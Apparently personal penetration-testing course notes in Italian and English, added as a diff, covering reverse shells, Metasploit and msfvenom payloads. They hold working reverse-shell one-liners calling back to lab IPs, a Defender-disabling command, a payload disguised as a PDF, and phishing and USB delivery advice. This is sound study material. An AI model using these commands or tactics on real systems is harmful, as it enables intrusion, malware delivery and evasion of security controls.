@@ -100,4 +100,264 @@ crirom00@htb[/htb]$ sudo nc -lvnp 443
 3. Strategia OperativaAnalisi dell'Ambiente: Prima di tentare la reverse shell, occorre verificare quali interpreti e strumenti sono già disponibili sulla macchina vittima.PowerShell One-Liner: Per stabilire la reverse shell da Windows senza installare software esterno, lo standard consiste nell'eseguire un one-liner nativo in PowerShell.
 
 ## Client (target)
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
+### Disabe Antivirus
+PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
+
+## Server (attack box)
+crirom00@htb[/htb]$ sudo nc -lvnp 443
+
+-->  PS C:\Users\htb-student> whoami
+
+# Introduction to Payloads
+
+## Netcat/Bash Reverse Shell One-liner
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+
+## PowerShell One-liner Explained
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+### Calling PowerShell
+powershell -nop -c 
+
+### Binding A Socket
+"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
+
+
+### Setting The Command Stream
+$stream = $client.GetStream();
+
+### Empty Byte Stream
+[byte[]]$bytes = 0..65535|%{0}; 
+
+### Stream Parameters
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+
+
+### Set The Byte Encoding
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+
+### Invoke-Expression
+$sendback = (iex $data 2>&1 | Out-String ); 
+
+
+### Show Working Directory
+$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
+
+### Sets Sendbyte
+$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+
+### Terminate TCP Connection
+$client.Close()"
+
+The one-liner we just examined together can also be executed in the form of a PowerShell script (.ps1). We can see an example of this by viewing the source code below. This source code is part of the nishang project: [powershell script .ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+
+# Automating Payloads & Delivery with Metasploit
+crirom00@htb[/htb]$ sudo msfconsole 
+
+
+## Nmap scan
+crirom00@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25
+
+## Searching Within Metasploit
+msf6 > search smb
+
+## Option Selection
+msf6 > use 56
+
+## Examining an Exploit's Options
+msf6 exploit(windows/smb/psexec) > options
+
+## Setting Options
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
+
+## Exploits Away
+msf6 exploit(windows/smb/psexec) > exploit
+
+doppo aver lanciato l'exploit, se tutto va per il verso giusto viene stabilita una meterpreter shell session and a system level shell session. Meterpreter è un payload che usache stabilisce un canale di comunicazione fra target e attaccante. Con ? vediamo una lista di comandi da poter usare in meterpreter session, è bene lanciare il comando shell per ottenere una system-level shell per utilizzare tutti i comandi nativi del sistema target.
+
+
+# Crafting Payloads with MSFvenom
+
+Raggiungibilità di Rete vs. Consegna Alternativa
+
+Gli attacchi diretti con Metasploit richiedono connettività di rete verso il bersaglio.
+
+Quando il bersaglio si trova in una rete isolata o non direttamente raggiungibile, è necessario veicolare il payload in modo indiretto (es. tramite e-mail o tecniche di ingegneria sociale per indurre l'esecuzione del file).
+
+Flessibilità e Offuscamento con MSFvenom
+
+MSFvenom permette di generare payload in molteplici formati eseguibili e script per adattarsi a diversi contesti di consegna.
+
+Include funzionalità di encoding e cifratura per modificare la struttura del payload, riducendo la possibilità che venga rilevato dalle firme statiche degli antivirus.
+
+## Practicing with MSFvenom
+msfvenom -l payloads: list all payloads
+
+## Staged vs. Stageless Payloads
+1. Payload Staged: piu componenti inviate
+	
+	Funzionamento: Invia inizialmente un componente di dimensioni ridotte (stage) eseguito sulla macchina bersaglio, ed effettua una callback verso la macchina d'attacco per scaricare via rete il resto del payload, che viene poi eseguito in memoria per stabilire la sessione.
+
+	Sintassi in Metasploit: Riconoscibile dalla barra / che separa le componenti (es. linux/x86/shell/reverse_tcp).
+
+	Svantaggi: Occupa spazio in memoria per la gestione degli stadi e richiede più traffico di rete sequenziale, il che può causare instabilità se la connessione ha problemi di latenza o banda.
+
+2. Payload Stageless: singola componente inviata
+
+	Funzionamento: Contiene l'intero codice necessario all'interno di un unico pacchetto/eseguibile e viene inviato nella sua interezza in un'unica soluzione, senza scaricare componenti aggiuntivi via rete in un secondo momento.
+
+	Sintassi in Metasploit: Riconoscibile dall'uso dell'underscore _ prima del tipo di connessione (es. linux/zarch/meterpreter_reverse_tcp).
+
+	Vantaggi:
+
+	Stabilità: Ideale in ambienti con banda limitata o elevata latenza, dove il caricamento a stadi potrebbe fallire o interrompersi.
+
+	Evasione: Riduce il volume complessivo di traffico di rete generato dopo l'esecuzione iniziale, risultando spesso più discretodurante le fasi di consegna tramite ingegneria sociale.
+
+## Building A Stageless Payload
+### Build it
+crirom00@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+
+- msfvenom -p: defines the tool to make the payload and -p option create the payload
+- linux/...: choosing payload based on atch
+- LHOST=10.10.14.113 LPORT=443: specify the ip address and port to which the payload will call back
+- -f elf: specifies the format the generated binary will be in.
+- \> createbackup.elf: create elf binary
+
+
+## Executing stagelss payload
+Una volta generato un payload stageless sulla macchina d'attacco, è necessario veicolarlo sul sistema target. Tra i vettori di consegna più comuni figurano:
+
+- E-mail: Allegato malevolo inviato direttamente all'utente.
+
+- Link di download: Indirizzare l'utente a un sito web controllato dall'attaccante.
+
+- Modulo di exploit (Metasploit): Consegna automatizzata tramite rete (richiede solitamente l'accesso alla rete interna).
+
+- Supporti fisici: Unità flash USB nell'ambito di un audit di sicurezza in loco (onsite penetration test).
+
+Oltre al trasferimento, il file deve essere eseguito sul sistema bersaglio per attivare la sessione.
+
+Scenario: Se il target è una macchina Linux usata da un amministratore di rete per gestire dispositivi, l'esecuzione può avvenire inducendo l'amministratore a cliccare sull'allegato e-mail attraverso tecniche di ingegneria sociale, sfruttando abitudini di navigazione non sicure su una workstation di gestione.
+
+
+crirom00@htb[/htb]$ sudo nc -lvnp 443: si attende una connessione all'attaccante da parte del target tramite il payload lanciato
+
+## Building a simple Stageless Payload for a Windows system
+
+## Windows payload
+crirom00@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+
+## Executing a Simple Stageless Payload On a Windows System
+Senza alcun sistema di cifratura il payload verrebbe bloccato dell'av di windows. Se l'av viene disabilitato, gli utenti basta che clicchino sul file per eseguirlo.
+
+# Infiltrating Windows
+Microsoft domina il mercato home e enterprise dei computer. Con l'introduzione di Active Directory, servizi cloud, wsl, e molte altre features, la superficie d'attacco è cresciuta esponenzialmente (neli ultimi anni riportate circa 3688 vulnerabilità nei prodotti windows), per esempio:
+- MS08-067
+- Eternal Blue
+- PrintNightmare
+- BlueKeep
+- Sigred
+- SeriousSam
+- Zerologon
+
+## Enumerating Windows & Fingerprinting Methods
+Dati un insieme di target, in che modi posso decidere se l'host è una macchina windows? Guardiamo ad aclune cose: 
+1. ping TTL: un risposta tipa di windows è 32 oppure 128, dove la maggior parte degli host non ha mai piu di 20 hops dall'host di partenza ([ttl table](https://subinsb.com/default-device-ttl-values/)).
+
+2. Un altro modo è utilizzare nmap con l'opzione -O per identificare il sistema operativo. Se la scansione da problemi, riprova con opzioni -A e -Pn. 
+
+### Banner Grab to Enumerate Ports
+crirom00@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse: utilizzare banner.nse script per tentare di connettersi ad ogni porta e catturare informazioni da esse. 
+
+## Bats, DLLs, & MSI Files
+
+### Payload types to consider
+Ciascun formato sfrutta diverse componenti o motori di esecuzione nativi del sistema operativo Windows per ottenere l'esecuzione di comandi o stabilire una shell:
+- DLL (Dynamic Link Library): Librerie condivise del sistema. Vengono utilizzate principalmente per tecniche di DLL Hijacking o DLL Injection, che consentono di eseguire codice all'interno del contesto di un processo legittimo per privilegiare l'accesso (es. a SYSTEM) o bypassare il User Account Control (UAC).
+
+- Batch (.bat): Script di testo per l'interprete dei comandi DOS (cmd.exe). Utili per l'automazione di comandi in sequenza, come la configurazione di connessioni di rete o la raccolta rapida di informazioni di sistema (enumeration).
+
+- VBScript (.vbs): Linguaggio di scripting interpretato dal Windows Script Host (WSH). Utilizzato prevalentemente nei vettori di Phishing o integrato come macro all'interno di documenti di Office (es. Excel) per avviare il caricamento di codice aggiuntivo.
+
+- MSI (.msi): File di installazione per il Windows I nstaller. Possono essere eseguiti tramite l'utilità nativa msiexec.exe, spesso sfruttata per l'esecuzione di payload con privilegi elevati durante le fasi di installazione o configurazione.
+
+- PowerShell (.ps1): Shell e ambiente di scripting avanzato basato sul framework .NET. Offre un'elevata flessibilità per interagire direttamente con le API del sistema operativo e gestire l'esecuzione in memoria.
+ 
+
+Scelta del Formato: Il tipo di file da generare dipende strettamente dal vettore di consegna (es. e-mail, esecuzione da riga di comando, sostituzione di librerie) e dal contesto del target.
+
+Living Off The Land: La maggior parte di questi formati sfrutta interpreti già presenti di default in Windows (cmd.exe, wscript.exe, msiexec.exe, powershell.exe), evitando la necessità di installare software aggiuntivo sul bersaglio.
+
+## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
+
+Metodi di generazione di payload e modi per trasferili alla vittima.
+
+### Payload generation
+- MSFVenom & Metasploit-Framework (https://github.com/rapid7/metasploit-framework)
+- Payloads All The Things (https://github.com/swisskyrepo/PayloadsAllTheThings)
+- Mythic C2 Framework (https://github.com/its-a-feature/Mythic)
+- Nishang (https://github.com/samratashok/nishang)
+- Darkarmour (https://github.com/bats3c/darkarmour)
+
+### Payload transfer and execution
+- Impacket: tool python che fornisce un modo per interagire direttamente con protocolli di rete.
+- Payload all the things: find quick oneliners per facilitare il trasferimento di files attaverso gli host.
+- SMB: può fornire un metodo facilmente sfruttabile per trasferire file tra host.
+- Remote execution via MSF
+- Other protocols: FTP, TFTP, HTTP/S, e altri protocolli per trasferire file agli host
+
+## CMD-Prompt and PowerShells for Fun and Profit
+1. Confronto Generale
+
+	CMD (cmd.exe): È la shell originale MS-DOS integrata in Windows, pensata per interazioni di base ed esecuzione di script batch semplici (.bat). L'input e l'output vengono gestiti esclusivamente come testo semplice.
+
+	PowerShell: È la shell moderna basata sull'ambiente .NET. Supporta tutti i comandi tradizionali di MS-DOS oltre a cmdlet avanzati e moduli personalizzati. Input e output vengono gestiti ed elaborati come oggetti .NET.
+
+2. Differenze su Tracciabilità e Sicurezza
+
+	Log e Tracciabilità: CMD non mantiene una cronologia dettagliata dei comandi eseguiti durante la sessione, risultando meno evidente nei log locali. PowerShell registra la cronologia dei comandi (es. PSReadLine), rendendo le azioni più visibili all'audit di sistema.
+
+	Criteri di Protezione: PowerShell è soggetto a restrizioni di sicurezza come la Execution Policy e i controlli UAC (User Account Control). CMD non è vincolato dalle Execution Policy di PowerShell.
+
+	Compatibilità Storica: PowerShell è stato introdotto nativamente a partire da Windows 7. Su sistemi legacy più datati (es. Windows XP o Server 2003), CMD è spesso l'unica shell disponibile.
+
+## WSL and powershell for linux
+1. Windows Subsystem for Linux (WSL) come Vettore di Attacco
+
+	Integrazione del Sistema: WSL fornisce un ambiente Linux virtualizzato all'interno di Windows, offrendo nuovi canali per l'esecuzione di payload e binary creati per Linux (o script Python3) direttamente su host Windows.
+
+	Punto Cieco per la Sicurezza: Attualmente, il traffico di rete e le chiamate eseguite dall'istanza WSL spesso non vengono analizzati dal Windows Firewall o da Windows Defender, consentendo l'evasione dei controlli AV ed EDR tradizionali dell'host.
+
+2. PowerShell Core su Linux
+	Cross-Platform: PowerShell Core consente l'esecuzione delle funzionalità tipiche di PowerShell anche su ambienti Linux.
+
+	Sfida di Rilevamento: Come per WSL, la presenza di PowerShell in ambienti Linux rappresenta un vettore meno monitorato dai controlli di sicurezza classici, rendendo le attività malevole più difficili da individuare dai log di sistema standard. 
+
+# Spawning interactive shells
+1. Il Problema della Shell Limitata (Jail Shell)
+
+	Quando si ottiene un primo accesso su un sistema Linux, spesso la shell generata è non-interattiva o priva del controllo dei job (no job control).
+
+	Se Python non è installato sul bersaglio (rendendo impossibile l'uso del classico python -c 'import pty; pty.spawn("/bin/bash")'), occorre utilizzare altri interpreti o strumenti nativi presenti nel sistema.
+
+2. Metodi per Generare una Shell Interattiva
+
+- /bin/sh -i: Avvia direttamente l'interprete di comandi standard in modalità interattiva (-i).
+
+-	Perl: perl -e 'exec "/bin/sh";' (esegue la shell sostituendo il processo Perl corrente).
+
+-	Ruby: ruby: exec "/bin/sh" (invocabile all'interno di uno script Ruby).
+
+-	Lua: lua: os.execute('/bin/sh') (sfrutta la funzione nativa di esecuzione comandi di sistema).
+
+-	AWK: awk 'BEGIN {system("/bin/sh")}' (esegue la shell nella clausola BEGIN prima dell'elaborazione di qualsiasi input).
+
+-	find . -exec /bin/sh \; -quit (sfrutta il parametro -exec per lanciare la shell ed uscire subito dopo).
+
+-	vim -c ':!/bin/sh' (esegue il comando tramite la flag -c all'avvio).
+
+	Oppure, dall'interno di Vim: :set shell=/bin/sh seguito dal comando :shell.
